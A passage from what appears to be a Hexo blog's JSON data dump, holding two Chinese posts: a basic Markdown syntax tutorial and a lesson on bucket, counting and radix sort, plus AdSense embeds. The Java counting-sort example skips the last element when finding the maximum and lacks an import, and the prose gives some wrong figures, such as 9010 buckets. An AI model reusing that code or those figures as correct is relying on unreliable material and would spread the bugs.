data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","source":"_posts/用Markdown来写文章.md","raw":"---\ntitle: 用Markdown来写文章\ndate: 2018-09-06 18:39:40\ntags: ['hexo','博客', 'Markdown']\ncategories: Markdown\n---\n\n## Markdown\n\nMarkdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成丰富的HTML页面。\n\nMarkdown用一些简单的符号标识不同的标题，将某些文章标记为\"**粗体**\"或者*斜体*，下面就来一起学习一下。\n\n\n<br>\n## 语法\n\n**1、标题**\n\n不同的标题采用不等个数的`#`号来进行标记，如下所示：\n\n```Markdown\n# 一级标题\n## 二级标题\n### 三级标题\n#### 四级标题\n```\n\n**2、代码块**\n\n在需要高亮的代码块的前一行及后一行使用三个反引号“\\`”，同时第一行反引号后面表面代码块所使用的语言, 如下：\n\n\\`\\`\\`pyhton\nprint (\"Hello World!\")\n\\`\\`\\`\n\n**3、特殊字符**\n\n```markdown\n**粗体**\n*斜体*\n> 引用内容\n```\n\n\n<br>\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","slug":"用Markdown来写文章","published":1,"updated":"2018-11-29T09:59:50.713Z","_id":"cjpdmv00p00104cv0sjr5lff6","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Markdown\"><a href=\"#Markdown\" class=\"headerlink\" title=\"Markdown\"></a>Markdown</h2><p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成丰富的HTML页面。</p>\n<p>Markdown用一些简单的符号标识不同的标题，将某些文章标记为”<strong>粗体</strong>“或者<em>斜体</em>，下面就来一起学习一下。</p>\n<p><br></p>\n<h2 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h2><p><strong>1、标题</strong></p>\n<p>不同的标题采用不等个数的<code>#</code>号来进行标记，如下所示：</p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\"># 一级标题</span></span><br><span class=\"line\"><span class=\"section\">## 二级标题</span></span><br><span class=\"line\"><span class=\"section\">### 三级标题</span></span><br><span class=\"line\"><span class=\"section\">#### 四级标题</span></span><br></pre></td></tr></table></figure>\n<p><strong>2、代码块</strong></p>\n<p>在需要高亮的代码块的前一行及后一行使用三个反引号“`”，同时第一行反引号后面表面代码块所使用的语言, 如下：</p>\n<p>```pyhton<br>print (“Hello World!”)<br>```</p>\n<p><strong>3、特殊字符</strong></p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"strong\">**粗体**</span></span><br><span class=\"line\"><span class=\"emphasis\">*斜体*</span></span><br><span class=\"line\"><span class=\"quote\">&gt; 引用内容</span></span><br></pre></td></tr></table></figure>\n<p><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Markdown\"><a href=\"#Markdown\" class=\"headerlink\" title=\"Markdown\"></a>Markdown</h2><p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成丰富的HTML页面。</p>\n<p>Markdown用一些简单的符号标识不同的标题，将某些文章标记为”<strong>粗体</strong>“或者<em>斜体</em>，下面就来一起学习一下。</p>\n<p><br></p>\n<h2 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h2><p><strong>1、标题</strong></p>\n<p>不同的标题采用不等个数的<code>#</code>号来进行标记，如下所示：</p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\"># 一级标题</span></span><br><span class=\"line\"><span class=\"section\">## 二级标题</span></span><br><span class=\"line\"><span class=\"section\">### 三级标题</span></span><br><span class=\"line\"><span class=\"section\">#### 四级标题</span></span><br></pre></td></tr></table></figure>\n<p><strong>2、代码块</strong></p>\n<p>在需要高亮的代码块的前一行及后一行使用三个反引号“`”，同时第一行反引号后面表面代码块所使用的语言, 如下：</p>\n<p>```pyhton<br>print (“Hello World!”)<br>```</p>\n<p><strong>3、特殊字符</strong></p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"strong\">**粗体**</span></span><br><span class=\"line\"><span class=\"emphasis\">*斜体*</span></span><br><span class=\"line\"><span class=\"quote\">&gt; 引用内容</span></span><br></pre></td></tr></table></figure>\n<p><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n"},{"title":"算法-排序(下)","date":"2018-09-25T15:37:09.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n上一节着重分析了几种常用排序算法的原理、时间复杂度、空间复杂度、稳定性等。今天会接触三种时间复杂度为O(n)的排序算法：桶排序、基数排序、计数排序。因为这些排序算法的时间复杂度是线性的，所以把这类排序算法叫做线性排序。之所以能做到线性的时间复杂度，是因为这三种算法是基于非比较的排序算法，都不涉及元素之间的比较操作。\n\n这几种算法理解起来都不难，时间、空间复杂度分析起来也很简单，但是对要排序的数据要求很苛刻，所以今天要**学习的重点是掌握这些排序算法的适用场景**。\n\n按照惯例，我先给出一道思考题：<font color=\"red\">**如何根据年龄给100万用户排序？**</font>，你可能会说，我用上一节讲的归并、快排就可以搞定啊！是的，他们也可以完成功能，但是时间复杂度最低也是$O(n\\*logN)$。有没有更快的排序方法呢？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 桶排序\n{% endnote %}\n</div>\n\n首先，我们来看桶排序。桶排序，顾名思义，要用到“桶”，核心思想是将要排序的数据分到几个有序的桶里，每个桶里的数据再单独排序。桶内排完序之后，再把桶里的数据按照顺序依次取出，组成的序列就是有序的了。\n\n{% asset_img 桶排序原理图.jpg %}\n\n桶排序的时间复杂度为什么是O(n)呢？我们一块儿来分析一下。\n\n如果要排序的数据有n个，我们把他们均匀的划分到m个桶内，每个桶里就有k=n/m个元素。每个桶内部使用快速排序，时间复杂度是$O(k\\*logk)$。m个桶排序的时间复杂度就是$O(m\\*k\\*logk)$，因为k=n/m，所以整个桶排序的时间复杂度就是$O(n\\*log\\frac{n}{m})$，当桶的个数m非常接近个数n时，$log\\frac{n}{m}$就是一个非常小的常量，这个时候桶排序的时间复杂度就接近O(n)。\n\n**桶排序看起来很优秀，那它是不是可以代替前面我们所说的排序算法呢？**\n\n答案是否定的，为了让你理解桶排序的原理，上面我们做了很多假设。实际上桶排序对数据的要求是非常苛刻的。\n\n首先，要排序的数据天然的就能划分成m个桶，并且桶与桶之间有着天然的大小顺序，这样每个桶内的数据都排序之后，桶与桶之间数据不需要再排序了。\n\n其次，数据在各个桶之间的分布是非常均匀的。如果数据经过桶的划分之后，有的桶里的数据非常多，有些非常少，很不均匀，那桶内数据排序的时间复杂度就不是常量级了。在极端情况下，如果数据都被划分到了一个桶里，那就退化为了$O(n\\*logN)$的排序算法了。\n\n**桶排序比较适合用在外部排序中**，外部排序是指数据存储在外部磁盘中，数据量比较大，内存有限，无法将数据全部加载到内存中。\n\n比如我们又10GB的订单数据，我们希望按照订单金额（假设金额都是正整数）进行排序，但是我们的内存有限，只有几百MB，没办法一次性把10GB数据全部加载到内存中。这个时候我们怎么办呢？\n\n现在我来讲一下，如何借助桶排序的处理思想来解决这个问题。\n\n我们可以先扫描一遍文件，看订单金额所处的数据范围。假设经过扫描之后我们得到，订单金额最小的是1元，最大是10万元。我们将所有订单根据金额划分到100个桶里，第一个桶存储1-1000元之间的订单，第二个桶存储1001-2000之间的订单，以此类推。每一个桶对应一个文件，并且按照金额范围大小顺序编号命名（00, 01, 02, 03 ... 99）。\n\n理想情况下，如果订单金额在1-10万之间均匀分布，那订单会被均匀划分到100个文件中，每个小文件存储大约100MB的内容，我们就可以将这100个小文件依次读取到内存中进行排序。等所有文件都排序号之后，我们只需要按照订单编号，从小到大依次读取每个小文件中的订单数据，并将其写入到一个文件中，那这个文件中存储的就是按照金额从小到大的订单数据了。\n\n不过，你可能也发现了，订单金额在1元到10万元之间并不一定是均匀分布的，所以10GB订单数据是无法均匀的划分到100个文件中的。有可能某个金额区间的数据特别多，划分之后对应的文件就会特别大，没法一次性读入内存，这时候该怎么办呢？\n\n针对这些划分之后还是比较大的文件，我们可以继续划分，比如，订单金额在1-1000之间的比较多，我们可以将这个区间再划分为10个小区间，1元到100元，101元到200元，201元到300元......901到1000元。如果划分之后，101元到200元之间订单还是太多，那就在继续划分，直到所有的文件都能读入内存为止。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 计数排序\n{% endnote %}\n</div>\n\n个人觉得，**计数排序其实是桶排序的一种特殊情况**。当要排序的n个数据，所处的范围并不大时，比如最大值是k，我们可以把数据分成k个桶，每个数据桶内的数据值是相同的，这样就省去了桶内的数据排序的时间。\n\n我们都经历过高考，高考计分系统还记得吗？我们查分数的时候，会显示我们的成绩以及所在省的排名。如果你所在省的考生有50万，那如何根据成绩快速排序得出名次呢？\n\n考生的满分是900分，最低是0分，这个数据的范围很小，所以我们可以分成901个桶，对应分数从0分到900分，根据考生的成绩，我们将这50万个考生划分到这901个桶内，桶内的数据都是分数相同的考生，所有并不需要排序。我们只需要依次扫描每个桶，将桶内的考生输出到一个数组中，就实现了50万考生的排序。因为只涉及扫描遍历操作，所以时间复杂度是O(n)。\n\n计数排序的算法思想就是这么简单，跟桶排序非常类似，只是桶的大小粒度不一样。**不过，为什么这个算法叫做\"计数\"排序呢？\"计数\"的含义来自哪里？**\n\n想弄明白这个问题，我们就要来看计数排序算法的实现方法。我们还是拿考生那个例子，为了方便说明，我对数据规模做了简化。假设猪油8个考生，分数在0-5之间，这8个考生的成绩存放在一个数组A[8]中，他们分别是2,5,3,0,2,3,0,3。\n\n考生的成绩从0分到5分，我们使用大小为6个数组C[6]表示桶，其中下标对应考生个数。像我们刚刚举得例子，我们只需要遍历以便考生分数，就可以得到C[6]的值。\n\n{% asset_img 计算排序01.jpg %}\n\n从图中可以看出，分数为3分的考生有3个，小于3分的考生有4个，所以，成绩为3的考生在排序之后的有序数组R[8]中，会保存下标4,5,6的位置。\n\n{% asset_img 计数排序02.jpg %}\n\n那如何快速计算出，每个分数的考生在有序数组中对应的存储位置呢？这个处理方法很巧妙，很不容易想到。\n\n思路是这样的：我们对C[6]数组顺序求和，C[6]数组就变成了下面这个样子。C[k]里存储的就是小于等于分数k的考生个数。\n\n{% asset_img 计数排序03.jpg %}\n\n有了前面的数据准备之后，现在就要讲解计数排序中最复杂、最难理解的一部分了。\n\n我们从后向前依次扫描数组A。比如，当扫描到3时，我们可以从数组C中取出下标为3的值7，也就是说，到目前为止，包括自己在内，分数小于等于3的考生有7个，也就是说3是数组R中第7个元素（也就是R[6]的位置）。当3放入数组R中后，小于等于3的元素就剩下了6个了，所以对应的C[6]也要减一，变成6。\n\n以此类推，当我们扫描到第二个分数为3的考生的时候，就会把它放入数组R中的第6个元素的位置(也就是下标为5的位置)。当我们扫描完数组A后，数组R内的数据就是按照分数从小到大有序排列的了。\n\n{% asset_img 计数排序04.jpg %}\n\n上面的过程有点复杂，我将其写成代码如下，你可以对照看下。\n\n```java\npublic class CountSort {\n    public static void main(String[] args) {\n        int[] a = new int[] {5,4,2,6,2,3,5,1,4,8,5,9,6,7,8,10,3,4,2,0}; // 20个人的成绩进行计数排序\n        System.out.println(\"计数排序前：\"+Arrays.toString(a));\n        countSort(a);\n        System.out.println(\"计数排序后：\"+Arrays.toString(a));\n    }\n    private static void countSort(int[] a) {\n        int n = a.length;\n        /* 创建桶数组C */\n        // 1、查找原数组的数据范围（必须是正整数）\n        int max = a[0];\n        for (int i = 0; i<a.length-1;i++){\n            if (a[i]>max){\n                max = a[i];\n            }\n        }\n        // 2、根据数据范围创建桶数组\n        int[] C = new int[max+1];\n        // 2.1、扫描原数组，将数据的个数放入桶C中\n        for (int anA : a) {\n            C[anA]++;\n        }\n        // 2.2、将C数组中的数据依次累加\n        for (int i=1;i<=max;i++){\n            C[i] = C[i-1] + C[i];\n        }\n        // 3、根据C桶中的计数将原数组a中的数据依次放入A数组中\n        // 3.1、创建临时数组A\n        int[] A = new int[n];\n        // 3.2、从后向前扫描a，并根据C放入A\n        for (int i = n-1; i>=0; i--){\n            A[C[a[i]]-1] = a[i];\n            C[a[i]]--;\n        }\n        // 4、拷贝数组A到原数组a\n        System.arraycopy(A, 0, a, 0, n);\n    }\n}\n```\n\n这种利用另外一个数组来计数的实现方式是不是非常巧妙呢？这也是这种排序算法加计数排序的原因。不过，你千万不要死记硬背上面的排序过程，重要的是理解和应用。\n\n总结一下，**计数排序只能用在数据范围不大的场合，如果数据范围k比要排序的数据n大很多，就不适合用计数排序了。而且，计数排序只能给非负整数排序，如果要排序的数据是其他类型的，要将其在不改变相对大小的情况下，转化为非负整数。**\n\n比如，还是拿考生这个例子。如果考生的成绩精确到小数后一位，我们就需要将所有的分数乘以10，转化为整数。然后在放入到9010个桶中。再比如，如果要排序的数据中有负数，数据范围是[-1000,1000]，那我们就需要对每个数据先加1000，转化为非负整数。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 基数排序\n{% endnote %}\n</div>\n\n我们再来看这样一个问题。假如我们有10万个手机号码，希望将这10万个手机号码从小到大排序，你有什么比较快速的排序方法？\n\n我们之前讲的快排，时间复杂度可以做到$O(nlogN)$，还有更高效的排序算法吗？桶排序、计数排序能排上用场吗？手机号有11位，范围很大，显然不适合用这两种算法。针对这个排序问题，有没有时间复杂度是O(n)的排序算法呢？下面我们就来看一种新的排序算法：基数排序。\n\n刚刚这个问题有这样的规律：如果比较的两个手机号a、b，前面的几位中，a手机号码已经比b大了，那后面的几位就不用比较了。\n\n借助稳定排序算法，这里有一个巧妙的实现思路。还记得在排序第一节中，我们讲到排序算法的稳定性时提到的订单的例子吗？我们这里也可以借助相同的处理思路，先按照最后一位来排序手机号，然后，再利用稳定排序算法按照倒数第二位来重新排序，以此类推，最后按照第一位重新排序，经过11次排序之后，手机号就有序了。\n\n手机号码稍微有点长，画图不容易看清楚，我这里用三位数进行排序的例子，画了一张基数排序的过程分解图，你可以看下：\n\n{% asset_img 基数排序01.jpg %}\n\n注意，这里按照每位进行排序的排序算法必须是稳定的，否则这个实现思路就是不正确的。因为如果是非稳定排序，那最后一次排序只会考虑最高位的大小顺序，完全不会管其他位的大小关系，那么低位的排序就完全没有意义了。\n\n根据每一位来排序，我们可以用刚刚讲过的桶排序或者计数排序，他们的时间复杂度可以做到O(n)，如果要排序的数据有k位，那我们就要k次桶排序或者计数排序，总的时间复杂度是O(k\\*n)。当k不大的时候，比如手机号排序的例子，k最大就是11，所以基数排序的时间复杂度近似于O(n)。\n\n实际上，有时候要排序的数据并不都是等长的，比如我们排序牛津字典中的20万个英文单词，最短的只有一个字母，最长的大概有45个字母，那么对于这种不等长的数据，基数排序还适用吗？\n\n实际上，**我们可以把所有的单词补齐到相同的长度，位数不够的可以在后面补“0”**，因为根据ASCII表，所有的字母值都大于“0”，所以补“0”并不会影响到原有的大小顺序，这样就可以继续基数排序了。\n\n总结一下，**基数排序对于要排序的数据是有要求的，需要可以分割出独立的“位”来比较，而且位之间有递进的关系，如果a数据的高位比b数据大，那剩下的位就不需要比较了，除此之外，每一位的数据范围不能太大，要可以用线性排序来排序，否则，基数排序的时间复杂度就不可能做到O(n)**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n今天的内容学完了，我们在回过头来看开篇的问题：如何按照年龄给100万用户排序？现在是不是问题变得简单了。\n\n实际上，根据年龄给100万用户排序，就类似按照成绩给50万用户排序。我们假设年龄的范围最小1岁，最大不超过120岁，我们可以遍历这100万用户，根据年龄将其放入这120个桶中，然后依次遍历这120个桶中的元素，这样就得到了按照年龄排序的100万用户数据。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天，我们学习了三种线性时间复杂度的排序算法，有桶排序、计数排序、基数排序。他们对要排序的数据有非常严格的要求，应用不是很广泛，但是如果数据特征符合这些排序算法的要求，应用这些算法，会非常高效，线性时间复杂度可以达到O(n)。\n\n桶排序和计数排序非常相似，都是针对数据范围不大的数据，将数据划分成不同的桶来实现排序。基数排序要求数据可以排成高低位，高位相同在比较低位。而且每一位的数据范围都不能太大，因为基数排序算法需要借助桶排序或计数排序实现每一位的排序工作。\n\n### 课后思考\n\n我们今天讲的都是针对特殊数据的排序算法。实际上，还有很多看似是排序但又不需要使用排序算法就能处理的排序问题。\n\n假设我们现在需要对\n\n\n\n<br>\n<br>\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-排序(下).md","raw":"---\ntitle: 算法-排序(下)\ndate: 2018-09-25 23:37:09\ntags: ['算法','排序']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n上一节着重分析了几种常用排序算法的原理、时间复杂度、空间复杂度、稳定性等。今天会接触三种时间复杂度为O(n)的排序算法：桶排序、基数排序、计数排序。因为这些排序算法的时间复杂度是线性的，所以把这类排序算法叫做线性排序。之所以能做到线性的时间复杂度，是因为这三种算法是基于非比较的排序算法，都不涉及元素之间的比较操作。\n\n这几种算法理解起来都不难，时间、空间复杂度分析起来也很简单，但是对要排序的数据要求很苛刻，所以今天要**学习的重点是掌握这些排序算法的适用场景**。\n\n按照惯例，我先给出一道思考题：<font color=\"red\">**如何根据年龄给100万用户排序？**</font>，你可能会说，我用上一节讲的归并、快排就可以搞定啊！是的，他们也可以完成功能，但是时间复杂度最低也是$O(n\\*logN)$。有没有更快的排序方法呢？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 桶排序\n{% endnote %}\n</div>\n\n首先，我们来看桶排序。桶排序，顾名思义，要用到“桶”，核心思想是将要排序的数据分到几个有序的桶里，每个桶里的数据再单独排序。桶内排完序之后，再把桶里的数据按照顺序依次取出，组成的序列就是有序的了。\n\n{% asset_img 桶排序原理图.jpg %}\n\n桶排序的时间复杂度为什么是O(n)呢？我们一块儿来分析一下。\n\n如果要排序的数据有n个，我们把他们均匀的划分到m个桶内，每个桶里就有k=n/m个元素。每个桶内部使用快速排序，时间复杂度是$O(k\\*logk)$。m个桶排序的时间复杂度就是$O(m\\*k\\*logk)$，因为k=n/m，所以整个桶排序的时间复杂度就是$O(n\\*log\\frac{n}{m})$，当桶的个数m非常接近个数n时，$log\\frac{n}{m}$就是一个非常小的常量，这个时候桶排序的时间复杂度就接近O(n)。\n\n**桶排序看起来很优秀，那它是不是可以代替前面我们所说的排序算法呢？**\n\n答案是否定的，为了让你理解桶排序的原理，上面我们做了很多假设。实际上桶排序对数据的要求是非常苛刻的。\n\n首先，要排序的数据天然的就能划分成m个桶，并且桶与桶之间有着天然的大小顺序，这样每个桶内的数据都排序之后，桶与桶之间数据不需要再排序了。\n\n其次，数据在各个桶之间的分布是非常均匀的。如果数据经过桶的划分之后，有的桶里的数据非常多，有些非常少，很不均匀，那桶内数据排序的时间复杂度就不是常量级了。在极端情况下，如果数据都被划分到了一个桶里，那就退化为了$O(n\\*logN)$的排序算法了。\n\n**桶排序比较适合用在外部排序中**，外部排序是指数据存储在外部磁盘中，数据量比较大，内存有限，无法将数据全部加载到内存中。\n\n比如我们又10GB的订单数据，我们希望按照订单金额（假设金额都是正整数）进行排序，但是我们的内存有限，只有几百MB，没办法一次性把10GB数据全部加载到内存中。这个时候我们怎么办呢？\n\n现在我来讲一下，如何借助桶排序的处理思想来解决这个问题。\n\n我们可以先扫描一遍文件，看订单金额所处的数据范围。假设经过扫描之后我们得到，订单金额最小的是1元，最大是10万元。我们将所有订单根据金额划分到100个桶里，第一个桶存储1-1000元之间的订单，第二个桶存储1001-2000之间的订单，以此类推。每一个桶对应一个文件，并且按照金额范围大小顺序编号命名（00, 01, 02, 03 ... 99）。\n\n理想情况下，如果订单金额在1-10万之间均匀分布，那订单会被均匀划分到100个文件中，每个小文件存储大约100MB的内容，我们就可以将这100个小文件依次读取到内存中进行排序。等所有文件都排序号之后，我们只需要按照订单编号，从小到大依次读取每个小文件中的订单数据，并将其写入到一个文件中，那这个文件中存储的就是按照金额从小到大的订单数据了。\n\n不过，你可能也发现了，订单金额在1元到10万元之间并不一定是均匀分布的，所以10GB订单数据是无法均匀的划分到100个文件中的。有可能某个金额区间的数据特别多，划分之后对应的文件就会特别大，没法一次性读入内存，这时候该怎么办呢？\n\n针对这些划分之后还是比较大的文件，我们可以继续划分，比如，订单金额在1-1000之间的比较多，我们可以将这个区间再划分为10个小区间，1元到100元，101元到200元，201元到300元......901到1000元。如果划分之后，101元到200元之间订单还是太多，那就在继续划分，直到所有的文件都能读入内存为止。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 计数排序\n{% endnote %}\n</div>\n\n个人觉得，**计数排序其实是桶排序的一种特殊情况**。当要排序的n个数据，所处的范围并不大时，比如最大值是k，我们可以把数据分成k个桶，每个数据桶内的数据值是相同的，这样就省去了桶内的数据排序的时间。\n\n我们都经历过高考，高考计分系统还记得吗？我们查分数的时候，会显示我们的成绩以及所在省的排名。如果你所在省的考生有50万，那如何根据成绩快速排序得出名次呢？\n\n考生的满分是900分，最低是0分，这个数据的范围很小，所以我们可以分成901个桶，对应分数从0分到900分，根据考生的成绩，我们将这50万个考生划分到这901个桶内，桶内的数据都是分数相同的考生，所有并不需要排序。我们只需要依次扫描每个桶，将桶内的考生输出到一个数组中，就实现了50万考生的排序。因为只涉及扫描遍历操作，所以时间复杂度是O(n)。\n\n计数排序的算法思想就是这么简单，跟桶排序非常类似，只是桶的大小粒度不一样。**不过，为什么这个算法叫做\"计数\"排序呢？\"计数\"的含义来自哪里？**\n\n想弄明白这个问题，我们就要来看计数排序算法的实现方法。我们还是拿考生那个例子，为了方便说明，我对数据规模做了简化。假设猪油8个考生，分数在0-5之间，这8个考生的成绩存放在一个数组A[8]中，他们分别是2,5,3,0,2,3,0,3。\n\n考生的成绩从0分到5分，我们使用大小为6个数组C[6]表示桶，其中下标对应考生个数。像我们刚刚举得例子，我们只需要遍历以便考生分数，就可以得到C[6]的值。\n\n{% asset_img 计算排序01.jpg %}\n\n从图中可以看出，分数为3分的考生有3个，小于3分的考生有4个，所以，成绩为3的考生在排序之后的有序数组R[8]中，会保存下标4,5,6的位置。\n\n{% asset_img 计数排序02.jpg %}\n\n那如何快速计算出，每个分数的考生在有序数组中对应的存储位置呢？这个处理方法很巧妙，很不容易想到。\n\n思路是这样的：我们对C[6]数组顺序求和，C[6]数组就变成了下面这个样子。C[k]里存储的就是小于等于分数k的考生个数。\n\n{% asset_img 计数排序03.jpg %}\n\n有了前面的数据准备之后，现在就要讲解计数排序中最复杂、最难理解的一部分了。\n\n我们从后向前依次扫描数组A。比如，当扫描到3时，我们可以从数组C中取出下标为3的值7，也就是说，到目前为止，包括自己在内，分数小于等于3的考生有7个，也就是说3是数组R中第7个元素（也就是R[6]的位置）。当3放入数组R中后，小于等于3的元素就剩下了6个了，所以对应的C[6]也要减一，变成6。\n\n以此类推，当我们扫描到第二个分数为3的考生的时候，就会把它放入数组R中的第6个元素的位置(也就是下标为5的位置)。当我们扫描完数组A后，数组R内的数据就是按照分数从小到大有序排列的了。\n\n{% asset_img 计数排序04.jpg %}\n\n上面的过程有点复杂，我将其写成代码如下，你可以对照看下。\n\n```java\npublic class CountSort {\n    public static void main(String[] args) {\n        int[] a = new int[] {5,4,2,6,2,3,5,1,4,8,5,9,6,7,8,10,3,4,2,0}; // 20个人的成绩进行计数排序\n        System.out.println(\"计数排序前：\"+Arrays.toString(a));\n        countSort(a);\n        System.out.println(\"计数排序后：\"+Arrays.toString(a));\n    }\n    private static void countSort(int[] a) {\n        int n = a.length;\n        /* 创建桶数组C */\n        // 1、查找原数组的数据范围（必须是正整数）\n        int max = a[0];\n        for (int i = 0; i<a.length-1;i++){\n            if (a[i]>max){\n                max = a[i];\n            }\n        }\n        // 2、根据数据范围创建桶数组\n        int[] C = new int[max+1];\n        // 2.1、扫描原数组，将数据的个数放入桶C中\n        for (int anA : a) {\n            C[anA]++;\n        }\n        // 2.2、将C数组中的数据依次累加\n        for (int i=1;i<=max;i++){\n            C[i] = C[i-1] + C[i];\n        }\n        // 3、根据C桶中的计数将原数组a中的数据依次放入A数组中\n        // 3.1、创建临时数组A\n        int[] A = new int[n];\n        // 3.2、从后向前扫描a，并根据C放入A\n        for (int i = n-1; i>=0; i--){\n            A[C[a[i]]-1] = a[i];\n            C[a[i]]--;\n        }\n        // 4、拷贝数组A到原数组a\n        System.arraycopy(A, 0, a, 0, n);\n    }\n}\n```\n\n这种利用另外一个数组来计数的实现方式是不是非常巧妙呢？这也是这种排序算法加计数排序的原因。不过，你千万不要死记硬背上面的排序过程，重要的是理解和应用。\n\n总结一下，**计数排序只能用在数据范围不大的场合，如果数据范围k比要排序的数据n大很多，就不适合用计数排序了。而且，计数排序只能给非负整数排序，如果要排序的数据是其他类型的，要将其在不改变相对大小的情况下，转化为非负整数。**\n\n比如，还是拿考生这个例子。如果考生的成绩精确到小数后一位，我们就需要将所有的分数乘以10，转化为整数。然后在放入到9010个桶中。再比如，如果要排序的数据中有负数，数据范围是[-1000,1000]，那我们就需要对每个数据先加1000，转化为非负整数。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 基数排序\n{% endnote %}\n</div>\n\n我们再来看这样一个问题。假如我们有10万个手机号码，希望将这10万个手机号码从小到大排序，你有什么比较快速的排序方法？\n\n我们之前讲的快排，时间复杂度可以做到$O(nlogN)$，还有更高效的排序算法吗？桶排序、计数排序能排上用场吗？手机号有11位，范围很大，显然不适合用这两种算法。针对这个排序问题，有没有时间复杂度是O(n)的排序算法呢？下面我们就来看一种新的排序算法：基数排序。\n\n刚刚这个问题有这样的规律：如果比较的两个手机号a、b，前面的几位中，a手机号码已经比b大了，那后面的几位就不用比较了。\n\n借助稳定排序算法，这里有一个巧妙的实现思路。还记得在排序第一节中，我们讲到排序算法的稳定性时提到的订单的例子吗？我们这里也可以借助相同的处理思路，先按照最后一位来排序手机号，然后，再利用稳定排序算法按照倒数第二位来重新排序，以此类推，最后按照第一位重新排序，经过11次排序之后，手机号就有序了。\n\n手机号码稍微有点长，画图不容易看清楚，我这里用三位数进行排序的例子，画了一张基数排序的过程分解图，你可以看下：\n\n{% asset_img 基数排序01.jpg %}\n\n注意，这里按照每位进行排序的排序算法必须是稳定的，否则这个实现思路就是不正确的。因为如果是非稳定排序，那最后一次排序只会考虑最高位的大小顺序，完全不会管其他位的大小关系，那么低位的排序就完全没有意义了。\n\n根据每一位来排序，我们可以用刚刚讲过的桶排序或者计数排序，他们的时间复杂度可以做到O(n)，如果要排序的数据有k位，那我们就要k次桶排序或者计数排序，总的时间复杂度是O(k\\*n)。当k不大的时候，比如手机号排序的例子，k最大就是11，所以基数排序的时间复杂度近似于O(n)。\n\n实际上，有时候要排序的数据并不都是等长的，比如我们排序牛津字典中的20万个英文单词，最短的只有一个字母，最长的大概有45个字母，那么对于这种不等长的数据，基数排序还适用吗？\n\n实际上，**我们可以把所有的单词补齐到相同的长度，位数不够的可以在后面补“0”**，因为根据ASCII表，所有的字母值都大于“0”，所以补“0”并不会影响到原有的大小顺序，这样就可以继续基数排序了。\n\n总结一下，**基数排序对于要排序的数据是有要求的，需要可以分割出独立的“位”来比较，而且位之间有递进的关系，如果a数据的高位比b数据大，那剩下的位就不需要比较了，除此之外，每一位的数据范围不能太大，要可以用线性排序来排序，否则，基数排序的时间复杂度就不可能做到O(n)**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote 